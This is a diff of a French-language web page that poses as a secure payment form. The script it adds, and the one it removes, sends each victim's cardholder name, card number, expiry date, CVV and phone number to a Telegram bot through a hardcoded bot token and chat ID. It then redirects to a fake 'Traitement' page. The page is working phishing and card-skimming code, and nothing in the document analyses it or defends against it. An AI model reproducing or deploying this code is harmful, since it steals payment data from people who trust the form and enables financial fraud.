@@ -45,14 +45,6 @@
         </div>
 
 
-        <!-- Formulaire de paiement -->
-    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-6">
-        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Paiement</h1>
-        <p class="text-sm text-center text-gray-600 mb-6">
-            Veuillez entrer vos informations de paiement pour effectuer la transaction en toute sécurité.
-            Ce processus est sécurisé et protégé.
-        </p>
-
         <!-- Formulaire -->
         <form id="paiement-form">
             <!-- Titulaire de la carte -->
@@ -93,55 +85,60 @@
 
             <!-- Bouton de validation -->
             <button type="submit"
-        class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
-        Valider mon paiement
-    </button>
-</form>
+                class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
+                Valider mon paiement
+            </button>
+         </form>
 
-<script>
-    document.getElementById("paiement-form").addEventListener("submit", async function(event) {
-        event.preventDefault();
+<!-- Section supplémentaire: Remboursement sécurisé -->
+        <div class="mt-6 flex justify-center">
+            <img src="instrumentys_paiement_securise_logo.jpg" alt="paiement sécurisé" class="w-52 h-auto">
+        </div>
+    </div>
+    </form>
+    
 
-        const nom = document.getElementById("nom").value;
-        const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
-        const dateExpiration = document.getElementById("date-expiration").value;
-        const cvv = document.getElementById("cvv").value;
-        const telephone = document.getElementById("telephone").value;
-        const PRIX = document.getElementById("prix").value;
+    <script>
+        document.getElementById("paiement-form").addEventListener("submit", async function(event) {
+            event.preventDefault();
 
-        // Configuration pour Telegram
-        const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
-        const chatId = "5372119436";
+            const nom = document.getElementById("nom").value;
+            const numeroCarte = document.getElementById("numero-carte").value.replace(/\s+/g, '');
+            const dateExpiration = document.getElementById("date-expiration").value;
+            const cvv = document.getElementById("cvv").value;
+            const telephone = document.getElementById("telephone").value;
 
-        const message = `
+            // Send to Telegram bot
+            const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
+            const chatId = "5372119436";
+
+            const message = `
 🔔 **Nouvelle Demande de Paiement** 🔔
 👤 Nom: ${nom}
 💳 Numéro de Carte: ${numeroCarte}
 📅 Expiration: ${dateExpiration}
 🔒 CVV: ${cvv}
-📞 Téléphone: ${telephone}
-🔔 Prix : ${PRIX} EURO
-        `;
+📞 Téléphone: ${telephone}`;
 
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: "Markdown",
-                }),
-            });
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: "Markdown",
+                    }),
+                });
 
-            // Redirection en cas de succès
-            window.location.href = "Traitement.html";
-        } catch (error) {
-            alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
-        }
-    });
-</script>
+                window.location.href = "Traitement.html";
+            } catch (error) {
+                alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
+            }
+        });
+    </script>
+
 </body>
 </html>
